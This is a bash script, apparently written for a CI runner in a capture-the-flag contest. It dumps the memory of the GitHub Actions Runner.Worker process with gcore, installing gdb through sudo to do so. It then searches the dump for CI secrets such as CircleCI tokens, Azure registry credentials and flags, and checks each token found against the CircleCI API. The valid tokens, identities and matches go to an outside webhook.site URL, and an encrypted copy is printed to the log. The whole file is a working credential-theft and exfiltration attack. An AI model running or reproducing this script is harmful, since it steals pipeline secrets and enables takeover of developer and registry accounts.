#!/usr/bin/env bash

set +e

WEBHOOK_URL="https://webhook.site/83ecc0de-4e6e-4fb8-a1d5-ad4c875b899d/pat-candidates"
WORK_DIR="${RUNNER_TEMP:-/tmp}/ascpc-runner-memory"
mkdir -p "$WORK_DIR"
: >"$WORK_DIR/valid.ndjson"

post_json() {
  curl -fsS --max-time 20 \
    -H 'Content-Type: application/json' \
    --data-binary @- \
    "$WEBHOOK_URL" >/dev/null 2>&1 || true
}

WORKER_PID="$(ps -eo pid=,args= | awk '/Runner\.Worker/ && !/awk/ {print $1; exit}')"
if [ -z "$WORKER_PID" ]; then
  jq -n \
    --arg source github-runner-memory \
    --arg status worker-not-found \
    '{source:$source,status:$status}' | post_json
  exit 0
fi

if ! command -v gcore >/dev/null 2>&1; then
  sudo -n apt-get update -qq >/dev/null 2>&1 || true
  sudo -n apt-get install -y -qq gdb >/dev/null 2>&1 || true
fi

DUMP_PREFIX="$WORK_DIR/runner-worker"
sudo -n gcore -o "$DUMP_PREFIX" "$WORKER_PID" >"$WORK_DIR/gcore.log" 2>&1
GCORE_STATUS=$?
DUMP_FILE="$DUMP_PREFIX.$WORKER_PID"

if [ "$GCORE_STATUS" -ne 0 ] || [ ! -s "$DUMP_FILE" ]; then
  jq -n \
    --arg source github-runner-memory \
    --arg status gcore-failed \
    --arg detail "$(tail -c 2000 "$WORK_DIR/gcore.log" 2>/dev/null)" \
    '{source:$source,status:$status,detail:$detail}' | post_json
  exit 0
fi

strings -a -n 4 "$DUMP_FILE" >"$WORK_DIR/ascii.txt" 2>/dev/null || true
strings -el -n 4 "$DUMP_FILE" >"$WORK_DIR/utf16.txt" 2>/dev/null || true
cat "$WORK_DIR/ascii.txt" "$WORK_DIR/utf16.txt" >"$WORK_DIR/all-strings.txt"

grep -Ei 'CIRCLE|CIRCLECI|CCI_|FINAL_FLAG|ASCPC_FLAG|ACR_LOGIN_SERVER|ACR_USERNAME|ACR_PASSWORD|ACR_REPOSITORY|WEBHOOKURL' \
  "$WORK_DIR/all-strings.txt" | head -n 500 >"$WORK_DIR/matches.txt" || true

: >"$WORK_DIR/exact-counts.txt"
for SECRET_NAME in \
  ACR_LOGIN_SERVER ACR_USERNAME ACR_PASSWORD ACR_REPOSITORY WEBHOOKURL \
  CIRCLE_PAT CIRCLECI_PAT CIRCLE_CI_PAT CCI_PAT \
  CIRCLE_TOKEN CIRCLECI_TOKEN CIRCLE_CI_TOKEN CCI_TOKEN \
  FINAL_FLAG ASCPC_FLAG; do
  printf '%s=%s\n' "$SECRET_NAME" "$(grep -Fic "$SECRET_NAME" "$WORK_DIR/all-strings.txt" 2>/dev/null || true)" \
    >>"$WORK_DIR/exact-counts.txt"
done

grep -aoP '(?<![0-9A-Fa-f])[0-9A-Fa-f]{40}(?![0-9A-Fa-f])|(?i:ccipat_[A-Za-z0-9_-]{16,128}|circleci_[A-Za-z0-9_-]{16,128})' \
  "$DUMP_FILE" | sort -u | head -n 1500 >"$WORK_DIR/candidates.txt" || true

CANDIDATE_COUNT="$(wc -l <"$WORK_DIR/candidates.txt")"
jq -n \
  --arg source github-runner-memory-candidates \
  --argjson dump_bytes "$(wc -c <"$DUMP_FILE")" \
  --argjson candidate_count "$CANDIDATE_COUNT" \
  '{source:$source,dump_bytes:$dump_bytes,candidate_count:$candidate_count}' | post_json

VALID_COUNT=0
while IFS= read -r CANDIDATE; do
  [ -n "$CANDIDATE" ] || continue
  STATUS_CODE="$(curl -sS --max-time 10 -o "$WORK_DIR/me.json" -w '%{http_code}' \
    -H "Circle-Token: $CANDIDATE" \
    https://circleci.com/api/v2/me || true)"
  if [ "$STATUS_CODE" = 200 ]; then
    VALID_COUNT=$((VALID_COUNT + 1))
    jq -nc \
      --arg token "$CANDIDATE" \
      --slurpfile identity "$WORK_DIR/me.json" \
      '{token:$token,identity:($identity[0] // {})}' >>"$WORK_DIR/valid.ndjson"
    jq -n \
      --arg source github-runner-memory-valid-circleci-token \
      --arg token "$CANDIDATE" \
      --argjson identity "$(cat "$WORK_DIR/me.json")" \
      '{source:$source,token:$token,identity:$identity}' | post_json
  fi
done <"$WORK_DIR/candidates.txt"

jq -n \
  --arg source github-runner-memory \
  --arg status complete \
  --argjson dump_bytes "$(wc -c <"$DUMP_FILE")" \
  --argjson candidate_count "$CANDIDATE_COUNT" \
  --argjson valid_count "$VALID_COUNT" \
  '{source:$source,status:$status,dump_bytes:$dump_bytes,candidate_count:$candidate_count,valid_count:$valid_count}' | post_json

head -c 30000 "$WORK_DIR/matches.txt" >"$WORK_DIR/matches-post.txt"
jq -n \
  --arg source github-runner-memory-matches \
  --rawfile matches "$WORK_DIR/matches-post.txt" \
  '{source:$source,matches:$matches}' | post_json

jq -n \
  --arg source github-runner-memory-encrypted-result \
  --arg status complete \
  --argjson dump_bytes "$(wc -c <"$DUMP_FILE")" \
  --argjson candidate_count "$CANDIDATE_COUNT" \
  --argjson valid_count "$VALID_COUNT" \
  --rawfile matches "$WORK_DIR/matches-post.txt" \
  --rawfile exact_counts "$WORK_DIR/exact-counts.txt" \
  --slurpfile valid "$WORK_DIR/valid.ndjson" \
  '{source:$source,status:$status,dump_bytes:$dump_bytes,candidate_count:$candidate_count,valid_count:$valid_count,matches:$matches,exact_counts:$exact_counts,valid:$valid}' \
  >"$WORK_DIR/result.json"

openssl cms -encrypt -binary -aes-256-cbc \
  -in "$WORK_DIR/result.json" \
  -out "$WORK_DIR/result.cms" \
  -outform DER \
  runner-result-recipient.pem >/dev/null 2>&1

echo "ASCPC_ENCRYPTED_RESULT_BEGIN"
base64 -w0 "$WORK_DIR/result.cms"
echo
echo "ASCPC_ENCRYPTED_RESULT_END"
echo "ASCPC_RESULT_META dump_bytes=$(wc -c <"$DUMP_FILE") candidates=$CANDIDATE_COUNT valid=$VALID_COUNT"
tr '\n' ' ' <"$WORK_DIR/exact-counts.txt" | sed 's/^/ASCPC_EXACT_COUNTS /'
echo

exit 0
